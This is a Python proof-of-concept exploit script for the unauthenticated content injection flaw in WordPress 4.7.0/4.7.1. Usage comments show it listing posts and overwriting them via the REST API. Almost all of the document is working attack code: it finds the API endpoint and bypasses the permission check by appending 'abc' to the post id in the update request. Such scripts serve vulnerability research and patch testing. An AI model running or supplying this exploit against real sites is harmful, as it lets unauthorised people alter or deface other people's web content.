# 2017 - @leonjza
#
# Wordpress 4.7.0/4.7.1 Unauthenticated Content Injection PoC
# Full bug description: https://blog.sucuri.net/2017/02/content-injection-vulnerability-wordpress-rest-api.html

# Usage example:
#
# List available posts:
#
# $ python inject.py http://localhost:8070/
# * Discovering API Endpoint
# * API lives at: http://localhost:8070/wp-json/
# * Getting available posts
#  - Post ID: 1, Title: test, Url: http://localhost:8070/archives/1
#
# Update post with content from a file:
#
# $ cat content
# foo
#
# $ python inject.py http://localhost:8070/ 1 content
# * Discovering API Endpoint
# * API lives at: http://localhost:8070/wp-json/
# * Updating post 1
# * Post updated. Check it out at http://localhost:8070/archives/1
# * Update complete!

import json
import sys
import urllib2

from lxml import etree


def get_api_url(wordpress_url):
    response = urllib2.urlopen(wordpress_url)

    data = etree.HTML(response.read())
    u = data.xpath('//link[@rel="https://api.w.org/"]/@href')[0]

    # check if we have permalinks
    if 'rest_route' in u:
        print(' ! Warning, looks like permalinks are not enabled. This might not work!')

    return u


def get_posts(api_base):
    respone = urllib2.urlopen(api_base + 'wp/v2/posts')
    posts = json.loads(respone.read())

    for post in posts:
        print(' - Post ID: {0}, Title: {1}, Url: {2}'
              .format(post['id'], post['title']['rendered'], post['link']))


def update_post(api_base, post_id, post_content):
    # more than just the content field can be updated. see the api docs here:
    # https://developer.wordpress.org/rest-api/reference/posts/#update-a-post
    data = json.dumps({
        'content': post_content
    })

    url = api_base + 'wp/v2/posts/{post_id}/?id={post_id}abc'.format(post_id=post_id)
    req = urllib2.Request(url, data, {'Content-Type': 'application/json'})
    response = urllib2.urlopen(req).read()

    print('* Post updated. Check it out at {0}'.format(json.loads(response)['link']))


def print_usage():
    print('Usage: {0} <url> (optional: <post_id> <file with post_content>)'.format(__file__))


if __name__ == '__main__':

    # ensure we have at least a url
    if len(sys.argv) < 2:
        print_usage()
        sys.exit(1)

    # if we have a post id, we need content too
    if 2 < len(sys.argv) < 4:
        print('Please provide a file with post content with a post id')
        print_usage()
        sys.exit(1)

    print('* Discovering API Endpoint')
    api_url = get_api_url(sys.argv[1])
    print('* API lives at: {0}'.format(api_url))

    # if we only have a url, show the posts we have have
    if len(sys.argv) < 3:
        print('* Getting available posts')
        get_posts(api_url)

        sys.exit(0)

    # if we get here, we have what we need to update a post!
    print('* Updating post {0}'.format(sys.argv[2]))
    with open(sys.argv[3], 'r') as content:
        new_content = content.readlines()

    update_post(api_url, sys.argv[2], ''.join(new_content))

    print('* Update complete!')